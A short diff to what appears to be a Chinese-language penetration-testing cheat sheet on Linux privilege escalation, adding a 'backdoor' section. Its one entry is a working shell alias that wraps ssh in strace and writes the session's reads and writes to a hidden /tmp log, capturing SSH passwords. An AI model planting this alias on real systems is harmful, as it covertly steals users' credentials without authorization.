@@ -14,3 +14,8 @@
 - 利用可用的root权限
     - ``sudo -l``
 - 利用误配置的 crontab 任务
+
+后门
+----------------------------------------
+- strace 后门
+    - ``alias ssh='strace -o /tmp/.ssh.log -e read,write,connect -s 2048 ssh'``
